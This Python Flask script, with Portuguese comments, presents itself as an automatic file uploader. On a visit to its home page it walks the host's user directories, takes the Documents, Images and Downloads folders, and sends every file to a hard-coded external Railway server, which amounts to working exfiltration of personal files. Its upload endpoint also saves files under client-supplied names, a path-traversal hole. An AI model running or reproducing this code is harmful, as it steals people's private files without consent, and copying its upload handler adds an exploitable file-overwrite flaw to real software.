import os
import logging
import requests
import platform
from flask import Flask, request, jsonify

# Configuração do log
logging.basicConfig(level=logging.INFO)

app = Flask(__name__)

# Caminho onde os arquivos enviados serão armazenados
UPLOAD_FOLDER = 'uploads'
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

# Função para fazer o upload dos arquivos
def upload_file(file_path):
    url = 'https://original-production-9fb7.up.railway.app/upload'  # Atualize para o endpoint público do Railway
    
    try:
        with open(file_path, 'rb') as file:
            files = {'file': (os.path.basename(file_path), file)}
            response = requests.post(url, files=files)
            if response.status_code == 200:
                logging.info(f"Arquivo {file_path} enviado com sucesso.")
            else:
                logging.error(f"Falha ao enviar o arquivo {file_path}: {response.text}")
    except Exception as e:
        logging.error(f"Erro ao tentar abrir o arquivo {file_path}: {str(e)}")

# Função para percorrer o diretório adequado, dependendo da plataforma
def get_directory_path():
    if platform.system() == 'Windows':
        return r'C:\Users'
    elif platform.system() == 'Linux' or platform.system() == 'Darwin': 
        return '/storage/emulated/0/Download'
    else:
        logging.error("Sistema operacional não suportado.")
        return None

# Função para verificar se o nome da pasta está na lista de pastas permitidas
def is_allowed_folder(folder_name, allowed_folders):
    return any(folder_name.lower() in allowed.lower() for allowed in allowed_folders)

# Função para verificar se o nome da pasta está na lista de pastas excluídas
def is_excluded_folder(folder_name, excluded_folders):
    return any(folder_name.lower() in excluded.lower() for excluded in excluded_folders)

# Função para percorrer o diretório e enviar os arquivos de pastas permitidas
def upload_files_from_directory(directory_path, allowed_folders, excluded_folders):
    for root, dirs, files in os.walk(directory_path):
        folder_name = os.path.basename(root)
        if is_allowed_folder(folder_name, allowed_folders) and not is_excluded_folder(folder_name, excluded_folders):
            logging.info(f"Processando arquivos da pasta: {folder_name}")
            for filename in files:
                file_path = os.path.join(root, filename)
                if not filename.startswith('.') and filename.lower() not in ['desktop.ini', 'thumbs.db']:
                    logging.info(f"Iniciando upload do arquivo: {file_path}")
                    upload_file(file_path)

@app.route('/')
def home():
    allowed_folders = ['Documentos', 'Imagens', 'Downloads']
    excluded_folders = ['Arquivos de Programas', 'Windows', 'AppData']
    directory_path = get_directory_path()
    if directory_path:
        logging.info(f"Iniciando upload dos arquivos de: {directory_path}")
        upload_files_from_directory(directory_path, allowed_folders, excluded_folders)
        return "Upload automático dos arquivos iniciado. Verifique os logs para o status."
    else:
        return "Sistema operacional não suportado."

@app.route('/upload', methods=['POST'])
def upload_file_route():
    if 'file' not in request.files:
        return jsonify({"error": "Nenhum arquivo enviado"}), 400
    
    file = request.files['file']
    if file.filename == '':
        return jsonify({"error": "Nenhum arquivo selecionado"}), 400
    
    file.save(os.path.join(app.config['UPLOAD_FOLDER'], file.filename))
    return jsonify({"message": f"Arquivo {file.filename} enviado com sucesso!"})

if __name__ == '__main__':
    port = int(os.getenv('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
